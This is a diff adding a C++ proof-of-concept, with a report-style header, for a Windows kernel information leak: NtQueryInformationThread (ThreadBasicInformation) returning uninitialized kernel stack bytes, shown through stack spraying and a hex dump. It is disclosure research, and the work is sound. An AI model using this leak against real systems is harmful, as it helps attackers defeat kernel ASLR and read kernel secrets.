@@ -1,0 +1,93 @@
+/*
+We have discovered that the nt!NtQueryInformationThread system call invoked with the 0 information class (ThreadBasicInformation) discloses portions of uninitialized kernel stack memory to user-mode clients. The vulnerability affects 64-bit versions of Windows 7 to 10.
+
+The specific layout of the corresponding output buffer is unknown to us; however, we have determined that the output size is 48 bytes. At offset 4 of the data, 4 uninitialized bytes from the kernel stack are leaked to the client application. This is most likely caused by compiler-introduced alignment between the first and second field of the structure (4-byte and 8-byte long, respectively). This would also explain why the leak does not manifest itself on x86 builds, as the second field is 4-byte long and therefore must be aligned to 4 instead of 8 bytes.
+
+The attached proof-of-concept program demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call. An example output is as follows:
+
+--- cut ---
+  00000000: 03 01 00 00 41 41 41 41 00 a0 10 2c f2 00 00 00 ....AAAA...,....
+  00000010: 90 1b 00 00 00 00 00 00 1c 3a 00 00 00 00 00 00 .........:......
+  00000020: ff 0f 00 00 00 00 00 00 09 00 00 00 00 00 00 00 ................
+--- cut ---
+
+It is clearly visible here that 4 bytes copied from ring-0 to ring-3 remained uninitialized. If the stack spraying function call is commented out, the top 32 bits of raw kernel pointers can be observed in the output.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+#define ThreadBasicInformation ((THREADINFOCLASS)0)
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  static bool initialized = false;
+  static HPALETTE(*EngCreatePalette)(
+    _In_ ULONG iMode,
+    _In_ ULONG cColors,
+    _In_ ULONG *pulColors,
+    _In_ FLONG flRed,
+    _In_ FLONG flGreen,
+    _In_ FLONG flBlue
+    );
+
+  if (!initialized) {
+    EngCreatePalette = (HPALETTE(*)(ULONG, ULONG, ULONG *, FLONG, FLONG, FLONG))GetProcAddress(LoadLibrary(L"gdi32.dll"), "EngCreatePalette");
+    initialized = true;
+  }
+
+  static ULONG buffer[256];
+  MyMemset((PBYTE)buffer, 'A', sizeof(buffer));
+  EngCreatePalette(1, ARRAYSIZE(buffer), buffer, 0, 0, 0);
+  MyMemset((PBYTE)buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  SprayKernelStack();
+
+  BYTE OutputBuffer[48] = { /* zero padding */ };
+  ULONG ReturnLength;
+  NTSTATUS st = NtQueryInformationThread(GetCurrentThread(), ThreadBasicInformation, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryInformationThread failed, %x\n", st);
+    return 1;
+  }
+
+  PrintHex(OutputBuffer, ReturnLength);
+
+  return 0;
+}
